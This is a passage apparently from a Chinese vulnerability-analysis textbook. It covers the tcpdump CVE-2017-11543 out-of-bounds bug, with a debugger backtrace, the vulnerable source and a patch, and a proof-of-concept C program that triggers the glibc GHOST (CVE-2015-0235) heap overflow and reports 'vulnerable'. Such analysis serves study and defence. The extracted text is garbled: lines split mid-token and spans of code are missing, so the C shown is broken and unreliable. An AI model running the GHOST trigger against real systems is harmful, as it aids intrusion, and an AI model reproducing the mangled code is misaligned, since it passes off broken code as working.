ndo=0xbfffdb90 是其他一些选项
在 lastlen[dir][lastconn] = length - (hlen , , ndo=0xbfffdb90)
at ./print-sl.c:253
#1 sliplink_print (length=0xe7e7e726, ip=0xb65ba810,
p=0xb65ba800 '\347' , , ndo=0xbfffdb90) at ./print-sl.c:166
#2 sl_if_print (ndo=0xbfffdb90, h=0xbfffd82c,
p=0xb65ba800 '\347' , ) at ./print-sl.c:77
#3 0x08060ed0 in pretty_print_packet (ndo=0xbfffdb90, h=0xbfffd
82c,
sp=0xb65ba800 '\347' , , packets_captured=0x1)
at ./print.c:339
#4 0x08055329 in print_packet (user=0xbfffdb90 "", h=0xbfffd82c
,
sp=0xb65ba800 '\347' , ) at ./tcpdump.c:2501
#5 0xb7a37468 in ?? () from /usr/lib/i386-linux-gnu/libpcap.so.
0.8
#6 0xb7a280e3 in pcap_loop () from /usr/lib/i386-linux-gnu/libp
cap.so.0.8
#7 0x08051219 in main (argc=0x4, argv=0xbfffef74) at ./tcpdump.
c:2004
#8 0xb787d637 in __libc_start_main (main=0x804f8f0 , argc
=0x4, argv=0xbfffef74,
init=0x818a160 , fini=0x818a1c0 , rtld_fini=0xb7fea8a0 ,
stack_end=0xbfffef6c) at ../csu/libc-start.c:291
#9 0x08054316 in _start ()
问题发生的原因是 sliplink_print 函数的 ND_PRINT((ndo, dir ==
SLIPDIR_IN ? "I " : "O ")); 没有考虑到 dir 既不是 0 也不是 1 的情况，错误
地把它当做一个发送的数据包处理，然后调用了 compressed_sl_print 函数，
导致非法内存地址访问。
1511
7.1.1 CVE-2017-11543 tcpdump sliplink_print 栈溢出漏洞
漏洞程序代码如下：
#define SLX_DIR 0
#define SLX_CHDR 1
#define CHDR_LEN 15
#define SLIPDIR_IN 0
#define SLIPDIR_OUT 1
static u_int lastlen[2][256];
static void
sliplink_print(netdissect_options *ndo,
register const u_char *p, register const struct i
p *ip,
register u_int length)
{
int dir;
u_int hlen;
dir = p[SLX_DIR];
ND_PRINT((ndo, dir == SLIPDIR_IN ? "I " : "O "));
if (ndo->ndo_nflag) {
/* XXX just dump the header */
register int i;
for (i = SLX_CHDR; i ip_p;
hlen = IP_HL(ip);
hlen += TH_OFF((const struct tcphdr *)&((const int *)ip)
[hlen]);
lastlen[dir][lastconn] = length - (hlen ndo_nflag) {
/* XXX just dump the header */
register int i;
@@ -155,13 +168,21 @@ sliplink_print(netdissect_options *ndo,
* has restored the IP header copy to IPPROTO_TC
P.
*/
lastconn = ((const struct ip *)&p[SLX_CHDR])->ip
_p;
+ ND_PRINT((ndo, "utcp %d: ", lastconn));
+ if (dir == -1) { // 在存取操作前检查 dir 的值
+ /* Direction is bogus, don't use it */
+ return;
+ }
hlen = IP_HL(ip);
hlen += TH_OFF((const struct tcphdr *)&((const i
nt *)ip)[hlen]);
lastlen[dir][lastconn] = length - (hlen 
#include 
#include 
#include 
1518
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
#include 
#define CANARY "in_the_coal_mine"
struct {
char buffer[1024];
char canary[sizeof(CANARY)];
} temp = { "buffer", CANARY };
int main(void) {
struct hostent resbuf;
struct hostent *result;
int herrno;
int retval;
/*** strlen (name) = size_needed - sizeof (*host_addr) - sizeo
f (*h_addr_ptrs) - 1; ***/
size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2
*sizeof(char *) - 1;
char name[sizeof(temp.buffer)];
memset(name, '0', len);
name[len] = '\0';
retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(te
mp.buffer), &result, &herrno);
if (strcmp(temp.canary, CANARY) != 0) {
puts("vulnerable");
exit(EXIT_SUCCESS);
}
if (retval == ERANGE) {
puts("not vulnerable");
exit(EXIT_SUCCESS);
}
puts("should not happen");
exit(EXIT_FAILURE);
}
1519
7.1.2 CVE-2015-0235 glibc __nss_hostname_digits_dots 堆溢出漏洞
$ file /lib/x86_64-linux-gnu/libc-2.15.so
/lib/x86_64-linux-gnu/libc-2.15.so: ELF 64-bit LSB shared object